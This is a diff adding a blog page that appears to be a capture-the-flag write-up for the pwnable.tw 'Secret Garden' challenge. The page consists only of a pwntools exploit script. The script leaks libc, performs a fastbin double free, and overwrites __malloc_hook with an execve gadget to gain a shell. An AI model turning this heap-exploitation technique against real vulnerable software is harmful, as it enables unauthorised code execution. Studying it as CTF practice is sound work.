@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>Secret Garden writeup | Ido Site</title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.152.2">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+<link rel="stylesheet" href="https://0x1do.github.io/css/index.css">
+<link rel="stylesheet" href="https://0x1do.github.io/PT-Sans/index.css">
+<link rel="canonical" href="https://0x1do.github.io/posts/secretgarden/">
+<link rel="alternate" type="application/rss+xml" href="" title="Ido Site">
+
+
+<header class="hover">
+  <h1 class=""><a href="https://0x1do.github.io/">Ido Site</a></h1>
+  
+  
+    
+      
+    
+  
+  
+</header>
+
+<article>
+  <header class="meta">
+    <h1><a href="/posts/secretgarden/">Secret Garden writeup</a></h1>
+    <time datetime="2025-02-14T16:52:32&#43;03:00">February 14, 2025</time>
+  </header>
+  <h2 id="exploit">Exploit:</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> warnings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;secretgarden_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;splitw&#34;</span>, <span style="color:#e6db74">&#34;-h&#34;</span>]
+</span></span><span style="display:flex;"><span>warnings<span style="color:#f92672">.</span>filterwarnings(<span style="color:#e6db74">&#34;ignore&#34;</span>, category<span style="color:#f92672">=</span><span style="color:#a6e22e">BytesWarning</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gs)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10203</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">raise_flower</span>(num, name, color):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice : &#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name :&#34;</span>, str(num))
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; flower :&#34;</span>, name)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; flower :&#34;</span>, str(color))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice : &#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_flower</span>(idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice : &#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;garden:&#34;</span>, str(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clean_garden</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice : &#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################exploit###########################</span>
+</span></span><span style="display:flex;"><span>execve <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xef6c4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mainoffset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;main arena offset from libc: &#34;</span> <span style="color:#f92672">+</span> hex(mainoffset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak libc</span>
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">144</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#34;daniel&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">6</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#39;ido&#39;</span>)
+</span></span><span style="display:flex;"><span>remove_flower(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;kaki&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>visit()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Name of the flower[2] :&#39;</span>)
+</span></span><span style="display:flex;"><span>main_arena <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> main_arena <span style="color:#f92672">-</span> mainoffset
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;LIBC: &#34;</span> <span style="color:#f92672">+</span> hex(libc))
+</span></span><span style="display:flex;"><span>malloc_hook <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3c3b10</span>
+</span></span><span style="display:flex;"><span>gadget <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> execve
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&gt;&gt;&gt; GADGET: &#34;</span> <span style="color:#f92672">+</span> str(gadget))
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">6</span> ,<span style="color:#e6db74">&#39;first&#39;</span>, <span style="color:#e6db74">&#39;blue&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># trigger double free</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, <span style="color:#e6db74">&#39;first&#39;</span>, <span style="color:#e6db74">&#39;blue&#39;</span>) <span style="color:#75715e"># index 4</span>
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, <span style="color:#e6db74">&#39;second&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>) <span style="color:#75715e"># inedx 5</span>
+</span></span><span style="display:flex;"><span>remove_flower(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>remove_flower(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>remove_flower(<span style="color:#ae81ff">4</span>) 
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&gt;&gt;&gt;&gt;&gt; malloc hook: &#34;</span><span style="color:#f92672">+</span> str(hex(malloc_hook<span style="color:#f92672">-</span><span style="color:#ae81ff">0x23</span>)))
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, p64(malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>), <span style="color:#e6db74">&#34;asd&#34;</span>)
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, <span style="color:#e6db74">&#34;asd&#34;</span>, <span style="color:#e6db74">&#34;asd&#34;</span>)
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, <span style="color:#e6db74">&#34;asd&#34;</span>, <span style="color:#e6db74">&#34;asd&#34;</span>)
+</span></span><span style="display:flex;"><span>raise_flower(<span style="color:#ae81ff">0x65</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x13</span> <span style="color:#f92672">+</span> p64(gadget), <span style="color:#e6db74">&#34;asd&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;overwrote hook&#34;</span>)
+</span></span><span style="display:flex;"><span>remove_flower(<span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+</article>
+
+
+<footer class="nowrap"><span></span> <a class="dark" href="/posts/mallocnotes/">Glibc malloc notes »</a></footer>
+
+
+</html>
